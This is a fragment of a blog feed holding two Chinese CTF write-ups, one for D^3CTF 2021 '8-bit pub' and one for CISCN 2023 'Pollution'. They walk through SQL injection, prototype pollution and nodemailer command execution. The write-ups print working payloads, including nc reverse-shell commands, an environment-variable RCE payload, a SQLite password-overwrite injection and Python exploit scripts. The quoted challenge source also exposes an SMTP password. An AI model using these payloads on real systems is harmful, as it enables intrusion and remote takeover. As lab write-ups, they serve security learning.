&#39;b&#39;], [&#39;c&#39;, &#39;d&#39;]]</code>会被转换为<code>(&#39;a&#39;, &#39;b&#39;), (&#39;c&#39;, &#39;d&#39;)</code></li><li>具有<code>toSqlString</code>方法的对象会调用<code>.toSqlString()</code>，并将返回的值作为初始SQL。</li><li>对象上的可枚举属性会被转换为<code>key = &#39;val&#39;</code>键值对。如果属性值是一个函数，该属性会被忽略。如果属性值是对象，会对其调用toString()并将返回的值作为val。</li><li><code>undefined</code>&#x2F;<code>null</code>会转换为<code>NULL</code></li><li><code>NaN</code>&#x2F;<code>Infinity</code>保持不变。 MySQL目前并不支持。如果你强行插入这类值，将触发MySQL错误。</li></ul></blockquote><p>这里是利用了传入对象会被转换为`key`&#x3D;val的键值对的这个特性</p><p>所以这里的操作是要传入一个对象，使用的是json格式的数据</p><p>在后面嵌套两个password的原因是就是传入一个对象。</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;password&quot;:true&#125;&#125;</code></pre><p>这样后台的查询语句是这样的,相当于构造了一个万能密码，SQL语句中逻辑运算符具有优先级，【&#x3D;】优先于【and】,【and】优先于【or】</p><p>sql查询语句如下</p><pre class="line-numbers language-none"><code class="language-none">username &#x3D; &#39;admin&#39; AND password &#x3D; &#96;password&#96; &#x3D; true</code></pre><p>在这里我本来有个疑惑，就是在传入对象的时候为什么不能再<code>username</code>那里也传入一组对象比如</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;username&quot;:&#123;&quot;username&quot;:admin&#125;,&quot;password&quot;:&#123;&quot;password&quot;:true&#125;&#125;</code></pre><p>但是经过尝试发现这样穿的话是不行的。后来问了其他师傅，在注册时传入上述的数据，然后进入数据库里面看了一下，发现如果传入的是对象的话解析之后传到数据库的内容都是NULL或者0，这样的话这句万能密码的sql语句就不能成立。</p><p><img src="/../../img/8-bit%20pub-images/2.png"></p><p>成功登陆之后我们可以直接跳转到admin页面</p><p><img src="/../../img/8-bit%20pub-images/3.png"></p><p>最早看到sql注入占位符的时候我以为是预编译，没办法注入（当然占位符也不能注入:（  ），所以我放弃了sql注入的想法，所以在这一步我原先的想法是去伪造session绕过身份验证去，因为我在通往admin的路由上看到还调用了auth.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">let auth &#x3D; function (req, res, next) &#123;  if (!req.session.username) &#123;    return res.redirect(302, &quot;&#x2F;&quot;);  &#125;  if (req.session.username !&#x3D;&#x3D; &quot;admin&quot;) &#123;    if (req.method &#x3D;&#x3D;&#x3D; &quot;GET&quot;) &#123;      return res.sendView(&quot;forbidden.html&quot;);    &#125; else &#123;      return res.json(&#123; message: &quot;Forbidden.&quot; &#125;);    &#125;  &#125;  next();&#125;;module.exports &#x3D; auth;</code></pre><p>这边验证的是<code>session.username</code>而<code>session.username</code>是从这里获得的</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">signin: function (req, res) &#123;  user.signin(req.body.username, req.body.password, function (err, result) &#123;    if (err) &#123;      return res.status(500).json(&#123; message: err.message &#125;);    &#125;    if (result.length) &#123;      console.log(req.session)      req.session.username &#x3D; result[0].username;      return res.json(&#123; message: &quot;Signin success.&quot; &#125;);    &#125; else &#123;      return res.status(401).json(&#123; message: &quot;Username or password wrong.&quot; &#125;);    &#125;  &#125;);&#125;,</code></pre><p>这里调用的user.signig()函数如下</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">signin: function (username, password, done) &#123;    sql.query(      &quot;SELECT * FROM users WHERE username &#x3D; ? AND password &#x3D; ?&quot;,      [username, password],      function (err, res) &#123;        if (err) &#123;          console.log(&quot;error: &quot;, err);          return done(err, null);        &#125; else &#123;          return done(null, res);        &#125;      &#125;    );  &#125;,&#125;;</code></pre><p>所以可以得到<code>result[0].username</code>的值即为<code>session.username</code></p><p>因为这题的环境是用docker搭的，没办法直接用vscode调试，所以这里的<code>result</code>的值没办法知道是什么，但猜测是数据库查询返回的结果，其中username是列名，所以我们应该是没办法伪造session的。。:(</p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>登陆成功后跳转到admin页面，看样子像一个发送邮件的页面。开始代码审计！</p><p>首先根据路由来到<code>adminController.js</code>的<code>email</code>方法，乍一看好像没有什么利用点。。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">  email: async function (req, res) &#123;    let contents &#x3D; &#123;&#125;;    Object.keys(req.body).forEach((key) &#x3D;&gt; &#123;      shvl.set(contents, key, req.body[key]);    &#125;);    contents.from &#x3D; &#39;&quot;admin&quot; 2449970596@qq.com&#39;;    try &#123;      await send(contents);      return res.json(&#123;message: &quot;Success.&quot;&#125;);    &#125; catch (err) &#123;      return res.status(500).json(&#123; message: err.message &#125;);    &#125;  &#125;,&#125;;</code></pre><p>这里有一个细节就是引入了shvl库（当时第一次审代码的时候完全没有放在心上，只是觉得有点奇怪而已，以后要多留意这些被引入的库）。</p><p>其中在发信前调用了<code>shvl.set</code>方法，我们根据路径查找到<code>/node_modules/shvl/index&quot;</code>发现如下代码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">export function set  (object, path, val, obj) &#123;  return !&#x2F;^(__proto__|constructor|prototype)$&#x2F;.test(path) &amp;&amp; ((path &#x3D; path.split ? path.split(&#39;.&#39;) : path.slice(0)).slice(0, -1).reduce(function (obj, p) &#123;    return obj[p] &#x3D; obj[p] || &#123;&#125;;  &#125;, obj &#x3D; object)[path.pop()] &#x3D; val), object;&#125;;</code></pre><p>看样子有点像合并函数，但是ban了可以用来原型链污染的所有关键字，所以无法利用。</p><p>其实这里出了点问题，我看网上师傅们的wp上的源码都是只有过滤<code>__proto__</code>而我手上的源码全过滤了，但是在实际测试中发现使用<code>constructor.prototype</code>又能绕过，orz.</p><p>检查package.json里的shvl版本也是2.02，在github上也能看到到了2.03版本的修复中才加上了<code>constructor</code>和<code>prototype</code>。</p><p><img src="/../../img/8-bit%20pub-images/4.png"></p><p>这里就当做只过滤<code>__proto__</code>来进行审计吧</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">export function set  (object, path, val, obj) &#123;  return !&#x2F;^(__proto__)$&#x2F;.test(path) &amp;&amp; ((path &#x3D; path.split ? path.split(&#39;.&#39;) : path.slice(0)).slice(0, -1).reduce(function (obj, p) &#123;    return obj[p] &#x3D; obj[p] || &#123;&#125;;  &#125;, obj &#x3D; object)[path.pop()] &#x3D; val), object;&#125;;</code></pre><p><strong>这里又get了一个审计小技巧，对于这种在github上开源且有release更新的话可以直接去查看修改了哪些代码，直接定位历史漏洞。</strong></p><p>首先实现使用test进行正则判断，path的参数内是否含有<code>__proto__</code>，所以可以判断这里存在原型链污染漏洞且使用<code>constructor.prototype</code>绕过。（虽然不是很懂后半部分代码的具体含义。。。）</p><p>找到原型链污染的地方后就要寻找利用点了。</p><p>这里有两种寻找利用点的方法</p><p>第一种</p><p>在vscode全局搜索RCE利用点，例如<code>child_process</code>，可以在<code>node_modules\nodemailer\lib\sendmail-transport\index.js</code>里找到如下代码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">const spawn &#x3D; require(&#39;child_process&#39;).spawn;const packageData &#x3D; require(&#39;..&#x2F;..&#x2F;package.json&#39;);const shared &#x3D; require(&#39;..&#x2F;shared&#39;);.....class SendmailTransport &#123;    constructor(options) &#123;        options &#x3D; options || &#123;&#125;;        &#x2F;&#x2F; use a reference to spawn for mocking purposes        this._spawn &#x3D; spawn;        this.options &#x3D; options || &#123;&#125;;......</code></pre><p>继续跟进查看</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">try &#123;           sendmail &#x3D; this._spawn(this.path, args);       &#125; catch (E) &#123;           this.logger.error(               &#123;                   err: E,                   tnx: &#39;spawn&#39;,                   messageId               &#125;,               &#39;Error occurred while spawning sendmail. %s&#39;,               E.message           );           return callback(E);       &#125;</code></pre><p>跟进<code>this.path</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">if (options) &#123;            if (typeof options &#x3D;&#x3D;&#x3D; &#39;string&#39;) &#123;                this.path &#x3D; options;            &#125; else if (typeof options &#x3D;&#x3D;&#x3D; &#39;object&#39;) &#123;                if (options.path) &#123;                    this.path &#x3D; options.path;                &#125;                if (Array.isArray(options.args)) &#123;                    this.args &#x3D; options.args;                &#125;                this.winbreak &#x3D; [&#39;win&#39;, &#39;windows&#39;, &#39;dos&#39;, &#39;\r\n&#39;].includes((options.newline || &#39;&#39;).toString().toLowerCase());            &#125;        &#125;    &#125;</code></pre><p>可以在这里看到要给<code>this.path</code>赋值的条件是<code>options</code>的类型要是对象和<code>option</code>的<code>args</code>属性是数组。</p><p>接着要做的是检查如何触发</p><p>回到<code>mail.js</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">const nodemailer &#x3D; require(&quot;nodemailer&quot;);async function send(contents) &#123;  let transporter &#x3D; nodemailer.createTransport(&#123;    service: &quot;qq&quot;, &#x2F;&#x2F; Plz use your own smtp server for testing    port: 465,    secureConnection: true,    auth: &#123;      user: &quot;2449970596@qq.com&quot;,      pass: &quot;qlwwytxigkuzebdf&quot;,    &#125;,  &#125;);  return transporter.sendMail(contents);&#125;module.exports &#x3D; send;</code></pre><p>这边可以继续跟进的地方是<code>createTransport</code>（没办法逐行debug真麻烦。。还要自己找）</p><p>在<code>node_modules\nodemailer\lib\nodemailer.js</code>中可以找到如下源码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module.exports.createTransport &#x3D; function (transporter, defaults) &#123;....        if (options.pool) &#123;            transporter &#x3D; new SMTPPool(options);        &#125; else if (options.sendmail) &#123;            transporter &#x3D; new SendmailTransport(options);        &#125; else if (options.streamTransport) &#123;            transporter &#x3D; new StreamTransport(options);        &#125; else if (options.jsonTransport) &#123;....</code></pre><p>只要<code>options.sendmail</code>的值为真，就会实例化<code>SendmailTransport</code>类，也就是我们上面要进行原型链污染的类</p><p>至此可以尝试构造原型链污染如下</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;constructor.prototype.sendmail&quot;:true,&quot;constructor.prototype.path&quot;:&quot;sh&quot;,&quot;constructor.prototype.args&quot;:[&quot;-c&quot;,&quot;nc ip port -e &#x2F;bin&#x2F;sh&quot;]&#125;</code></pre><p>这个poc是用于反弹shell的，因为我的SMTP服务器配置有问题，所以只能这样做。</p><p><img src="/../../img/8-bit%20pub-images/6.png"></p><p><img src="/../../img/8-bit%20pub-images/5.png"></p><p>这边放一下其他师傅通过任意读文获得flag的方式</p><p>在nodemailer文档中发现使用attachments 可以进行任意文件读取</p><p>先把文件写到tmp目录下</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">&#123;    &quot;constructor.prototype.sendmail&quot;:true,    &quot;constructor.prototype.path&quot;:&quot;sh&quot;,    &quot;constructor.prototype.args&quot;:[        &quot;-c&quot;,        &quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;flag.txt&quot;    ]&#125;</code></pre><p>再利用attachments带出</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">&#123;    &quot;to&quot;:&quot;i@example.com&quot;,    &quot;subject&quot;:&quot;flag&quot;,    &quot;constructor.prototype.attachments&quot;:[        &#123;            &quot;filename&quot;:&quot;flag.txt&quot;,            &quot;path&quot;:&quot;&#x2F;tmp&#x2F;flag.txt&quot;        &#125;    ]&#125;</code></pre><p>以下是之前构造错误的原型链，没有双引号，等号当冒号用，nc反弹shell格式出错。。用于提醒自己</p><pre class="line-numbers language-none"><code class="language-none">&#123;constructor.prototype.path&#x3D;bashconstructor.prototype.args&#x3D;[nc,ip,port]&#125;</code></pre><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>还有一个方法是污染原型链，先放个其他师傅的博客，后面再研究</p><blockquote><p>这里就比较直接了，因为nodemailer是有require<code>child_process</code>库的，那么我们可以使用<a href="https://blog.p6.is/Abusing-Environment-Variables/">Abusing Environment Variables (p6.is)</a>方法，污染env和shell，先放payload</p></blockquote><pre class="line-numbers language-json" data-language="json"><code class="language-json">&#123;    &quot;constructor.prototype.sendmail&quot;: True,    &quot;constructor.prototype.shell&quot;:&quot;node&quot;,    &quot;constructor.prototype.env.NODE_DEBUG&quot;: &quot;require(&#39;child_process&#39;).execSync(&#39;nc ip port -e &#x2F;bin&#x2F;bash&#39;);process.exit();&#x2F;&#x2F;&quot;,    &quot;constructor.prototype.env.NODE_OPTIONS&quot;:&quot;-r &#x2F;proc&#x2F;self&#x2F;environ&quot;&#125;</code></pre><blockquote><p>这里污染了环境变量之后，每次以node执行命令的时候，就会加载<code>NODE_OPTIONS</code>选项，从而执行<code>/proc/self/environ</code>中存在的js代码，那么就很简单了，当默认使用发邮件的时候，spawn会调用默认的shell，也就是&#x2F;bin&#x2F;sh</p></blockquote><p>参考资料：</p><p>47.103.121.189&#x2F;2023&#x2F;04&#x2F;20&#x2F;网鼎杯2023线下半决赛突破题errormsg复现&#x2F;</p><p><a href="https://blog.csdn.net/lllffg/article/details/114548517">https://blog.csdn.net/lllffg/article/details/114548517</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;D-3-CTF-2021-8-bit-pub复现&quot;&gt;&lt;a href=&quot;#D-3-CTF-2021-8-bit-pub复现&quot; class=&quot;headerlink&quot; title=&quot;D^3 CTF 2021 8-bit pub复现&quot;&gt;&lt;/a&gt;D^3 CTF 2021 8</summary>
      
    
    
    
    <category term="技术" scheme="https://mizore.site/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>2023_CISCN_Pollution</title>
    <link href="https://mizore.site/article/2023CISCN/2023_CISCN_Pollution/"/>
    <id>https://mizore.site/article/2023CISCN/2023_CISCN_Pollution/</id>
    <published>2023-06-24T07:57:25.501Z</published>
    <updated>2024-11-24T16:49:03.736Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2023-CISCN-Pollution"><a href="#2023-CISCN-Pollution" class="headerlink" title="2023_CISCN_Pollution"></a>2023_CISCN_Pollution</h2><p>开局经典登录框，一顿瞎试。查看源码可以猜测是使用sql注入，后来主办方也是提醒了在注册处存在sql注入。</p><p>经过注册登录测试可以猜到第一步是需要获得admin的密码。</p><p>在<code>app.js</code>里可以看到下列sql语句</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">db.all(&quot;SELECT * FROM users WHERE username&#x3D;? AND password&#x3D;?&quot;,[username,password],function(err,result)db.get(&quot;SELECT * FROM users WHERE username&#x3D;?&quot;, [username], function(err, row)let query &#x3D; &#96;INSERT INTO users (username, password) VALUES (&#39;$&#123;username&#125;&#39;, &#39;$&#123;utils.md5(password)&#125;&#39;)&#96;</code></pre><p>可以看到前两句都进行了预编译，所以无法进行注入，我们把重点放到第三句上。非常简单的单引号闭合，对于我来说难点就在这里使用的是SQLite进行注入，当时在比赛的时候还没接触过这类的sql注入。。。用sqlmap硬跑没跑出来。</p><p>完整sql查询代码如下</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">let query &#x3D; &#96;INSERT INTO users (username, password) VALUES (&#39;$&#123;username&#125;&#39;, &#39;$&#123;utils.md5(password)&#125;&#39;)&#96;;            db.run(query,function(err)&#123;              if(err)&#123;                console.error(err)                return res.send(&quot;&lt;script&gt;alert(&#39;Error!&#39;);window.location.href&#x3D;&#39;&#x2F;register&#39;&lt;&#x2F;script&gt;&quot;);              &#125;else&#123;                return res.send(&quot;&lt;script&gt;alert(&#39;Register successed&#39;);window.location.href&#x3D;&#39;&#x2F;login&#39;&lt;&#x2F;script&gt;&quot;);              &#125;</code></pre><p>可以看到对于语句执行错误或者成功会统一输出<code>Error</code>或者<code>success</code>，所以这里没办法使用报错注入或者直接联合查询拖库等查看admin密码。</p><p>这里的突破点是直接使用UPDATE语句来更新admin的密码。</p><p>经过测试常规的UPDATE语句没办法直接更新用户的密码，这里使用sqllite里的另一句更新数据的语句</p><pre class="line-numbers language-none"><code class="language-none">.....on CONFLICT DO.....</code></pre><p>所以构造如下注入语句</p><pre class="line-numbers language-none"><code class="language-none">admin&#39;, &#39;md5(123456)&#39;) on CONFLICT DO UPDATE password &#x3D; &#39;md5(123456)&#39; --+</code></pre><p>据此可以使用python写出如下脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">def SQLinjection(url):    url&#x3D;f&#39;&#123;url&#125;&#x2F;register&#39;    passwd&#x3D;&#39;123456&#39;    hash&#x3D;passwd.encode(&#39;UTF-8&#39;)    data&#x3D;&#123;        &quot;username&quot;:f&quot;admin&#39;,&#39;&#123;md5.md5(hash).hexdigest()&#125;&#39;) on CONFLICT DO UPDATE SET password&#x3D;&#39;&#123;md5.md5(hash).hexdigest()&#125;&#39; --+&quot;,        &quot;password&quot;:&quot;123456&quot;    &#125;    res&#x3D;s.post(url&#x3D;url,data&#x3D;data)    if res.status_code &#x3D;&#x3D; 200 :        print(&quot;injected successfully!\n&quot;,res.content)    else:        print(&quot;injected failed&quot;)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:80&quot;    SQLinjection(url)</code></pre><p>注入成功后就进入<code>/admin</code>页面了，然而web页面什么都没有。开始审计源码。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app.all(&quot;&#x2F;admin&quot;,utils.checkIsAdmin,function(req,res,next)&#123;  if(req.method &#x3D;&#x3D; &quot;GET&quot;)&#123;    return res.render(&#39;home&#39;,&#123;&#39;username&#39;:req.session.username&#125;)  &#125;  if(req.method &#x3D;&#x3D; &quot;POST&quot;)&#123;    var Info &#x3D;&#123;      &quot;username&quot;:&quot;admin&quot;,      &quot;message&quot;:&quot;Try2HackMe!&quot;    &#125;    try&#123;      utils.extend(Info, req.body);      return res.render(&#39;admin&#39;, &#123;&quot;username&quot;: Info.username, &quot;message&quot;: Info.message&#125;);    &#125;catch(err)&#123;      return res.send(&quot;&lt;script&gt;alert(&#39;Error!&#39;);window.location.href&#x3D;&#39;&#x2F;admin&#39;&lt;&#x2F;script&gt;&quot;);    &#125;  &#125;&#125;)</code></pre><p>定位到<code>utils.extend</code>在<code>utils.js</code>中查看源码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">static extend(target) &#123;        for (var i &#x3D; 1; i &lt; arguments.length; i++) &#123;            var source &#x3D; arguments[i]                        for (var key in source) &#123;                if (key &#x3D;&#x3D;&#x3D; &#39;__proto__&#39;) &#123;                    return;                &#125;                if (hasOwnProperty.call(source, key)) &#123;                    if (key in source &amp;&amp; key in target) &#123;                        Utils.extend(target[key], source[key])                    &#125; else &#123;                        target[key] &#x3D; source[key]                    &#125;                &#125;            &#125;        &#125;        return target    &#125;</code></pre><p>很典型的递归调用合并函数。至此可以判断下一步的利用点是原型链污染。</p><p>同时可以看到在<code>__proto__</code>属性被过滤了，这里使用<code>constructor.prototype</code>进行绕过。</p><p>现在把重点放在<code>entxend</code>函数后面的<code>render</code>函数里面。设置debug进行逐行审计。</p><pre class="line-numbers language-none"><code class="language-none">utils.js-&gt;render()response.js-&gt;app.render()application-&gt;view.render()twig.js-&gt;Twig.exports.twig()twig.js-&gt;Twig.Templates.loadRemote()twig.js-&gt;Twig.Templates.loadRemote()</code></pre><p>首先是进入response.js里的res.render()函数,这里的操作就是对一些数据进行了赋值。</p><p>接着进入到了application.js里的app.render()里，也是对一些数据进行了赋值。</p><p>接着进入到了application.js里的this.set(path)</p><p>在view.js里设置了fileName值为变量name的值，即<code>admin</code></p><p>接着在这里</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">if (!this.ext) &#123;   &#x2F;&#x2F; get extension from default engine name   this.ext &#x3D; this.defaultEngine[0] !&#x3D;&#x3D; &#39;.&#39;     ? &#39;.&#39; + this.defaultEngine     : this.defaultEngine;   fileName +&#x3D; this.ext; &#125;</code></pre><p>fileName被设置为了<code>admin.twig</code></p><p>接着还是在view.js里会调用lookup方法，根据文件名<code>admin.twig</code>查找并设置<code>path</code>值</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">&#x2F;&#x2F; lookup paththis.path &#x3D; this.lookup(fileName);</code></pre><p>然后又跳到了application.js里的view.render()里面</p><p>接着到twig.js里的<code>Twig.exports.renderFile()</code>，然后是Twig.exports.twig(params),这里的作用是加载渲染twig模板并输出。</p><p>进入<code>Twig.exports.renderFile()</code>后显示对params的各个参数进行判断</p><p>由于在上面我们知道了path值已经被设置为了<code>admin.twig</code>所以这里会进入判断，同时要注意这里传入的params对象已经没有了path属性。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">if (params.path !&#x3D;&#x3D; undefined) &#123;      return Twig.Templates.loadRemote(params.path, &#123;        id: id,        method: &#39;fs&#39;,        parser: params.parser || &#39;twig&#39;,        base: params.base,        module: params.module,        precompiled: params.precompiled,        async: params.async,        options: options      &#125;, params.load, params.error);    &#125;  &#125;; &#x2F;&#x2F; Extend Twig with a new filter.</code></pre><p>接着是<code>loadRemote</code>函数</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Twig.Templates.loadRemote &#x3D; function (location, params, callback, errorCallback) &#123;    &#x2F;&#x2F; Default to the URL so the template is cached.    var id &#x3D; typeof params.id &#x3D;&#x3D;&#x3D; &#39;undefined&#39; ? location : params.id;    var cached &#x3D; Twig.Templates.registry[id]; &#x2F;&#x2F; Check for existing template    if (Twig.cache &amp;&amp; typeof cached !&#x3D;&#x3D; &#39;undefined&#39;) &#123;      &#x2F;&#x2F; A template is already saved with the given id.      if (typeof callback &#x3D;&#x3D;&#x3D; &#39;function&#39;) &#123;        callback(cached);      &#125; &#x2F;&#x2F; TODO: if async, return deferred promise      return cached;    &#125; &#x2F;&#x2F; If the parser name hasn&#39;t been set, default it to twig    params.parser &#x3D; params.parser || &#39;twig&#39;;    params.id &#x3D; id; &#x2F;&#x2F; Default to async    if (typeof params.async &#x3D;&#x3D;&#x3D; &#39;undefined&#39;) &#123;      params.async &#x3D; true;    &#125; &#x2F;&#x2F; Assume &#39;fs&#39; if the loader is not defined    var loader &#x3D; this.loaders[params.method] || this.loaders.fs;    return loader.call(this, location, params, callback, errorCallback);  &#125;; &#x2F;&#x2F; Determine object type</code></pre><p>这边是通过params的id来加载模版。location变量正好是上面传入的<code>params.path</code>，且params.id为非空，所以这里是通过<code>params.id</code>来加载模板。而在上面的代码中，id的值也正好是path的值。</p><p><img src="/img/2023ciscn/1.png"></p><p>接着会通过call函数会调用到<code>registerLoader</code>函数</p><p><code>registerLoader</code>函数我们可以关注下面这一条</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">if (precompiled &#x3D;&#x3D;&#x3D; true) &#123;        data &#x3D; JSON.parse(data);      &#125;      params.data &#x3D; data;      params.path &#x3D; params.path || location; &#x2F;&#x2F; Template is in data</code></pre><p>因为在之前params的path属性已经被销毁，这里默认是location的路径。所以这里可以推测出一条利用链，通过原型链污染来控制path属性从而读取任意文件。</p><p>所以原型链可以按如下格式进行构造</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;constructor&quot;:&#123;&quot;protoytpe&quot;:&#123;&quot;path&quot;:&quot;flag路径&quot;&#125;&#125;&#125;</code></pre><p>根据上面的分析可以编写以下脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">![2](images&#x2F;2.png)import requestsimport hashlib as md5import jsons&#x3D;requests.session()url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&quot;def SQLinjection(url):    url&#x3D;f&#39;&#123;url&#125;&#x2F;register&#39;    passwd&#x3D;&#39;123456&#39;    hash&#x3D;passwd.encode(&#39;UTF-8&#39;)    data&#x3D;&#123;        &quot;username&quot;:f&quot;admin&#39;,&#39;&#123;md5.md5(hash).hexdigest()&#125;&#39;) on CONFLICT DO UPDATE SET password&#x3D;&#39;&#123;md5.md5(hash).hexdigest()&#125;&#39; --+&quot;,        &quot;password&quot;:&quot;123456&quot;    &#125;    res&#x3D;s.post(url&#x3D;url,data&#x3D;data)    if res.status_code &#x3D;&#x3D; 200 :        print(&quot;injected successfully!\n&quot;,res.content)    else:        print(&quot;injected failed&quot;)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:80&quot;    SQLinjection(url)#忘记写登录的逻辑了def Login(url):#获取登录session    url&#x3D;f&#39;&#123;url&#125;&#x2F;login&#39;    data&#x3D;&#123;        &quot;username&quot;:&quot;admin&quot;,        &quot;password&quot;:&quot;123456&quot;    &#125;    res&#x3D;s.post(url&#x3D;url,data&#x3D;data)    if res.status_code &#x3D;&#x3D; 200:        print(&quot;Login successful&quot;)    else:        print(&quot;Login failed&quot;)def pollution(url):    url&#x3D;f&#39;&#123;url&#125;&#x2F;admin&#39;    data&#x3D;&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;path&quot;:&quot;&#x2F;Users&#x2F;sammy&#x2F;Desktop&#x2F;临时题目文件夹&#x2F;pollute&#x2F;flag.txt&quot;&#125;&#125;    &#125;    data&#x3D;json.dumps(data)    res&#x3D;s.post(url&#x3D;url,data&#x3D;data,headers&#x3D;&#123;&quot;Content-Type&quot;:&quot;application&#x2F;json&quot;&#125;)    if res.status_code &#x3D;&#x3D; 200:        print(&quot;polluted successfully\n&quot;,res.content)    else:        print(&quot;polluted failed\n&quot;)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    SQLinjection(url)    Login(url)    pollution(url)</code></pre><p>获得flag</p><p><img src="/img/2023ciscn/2.png"></p><p>参考文章：kento师傅的复现wp</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2023-CISCN-Pollution&quot;&gt;&lt;a href=&quot;#2023-CISCN-Pollution&quot; class=&quot;headerlink&quot; title=&quot;2023_CISCN_Pollution&quot;&gt;&lt;/a&gt;2023_CISCN_Pollution&lt;/h2&gt;&lt;</summary>
      
    
    
    
    <category term="技术" scheme="https://mizore.site/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
</feed>
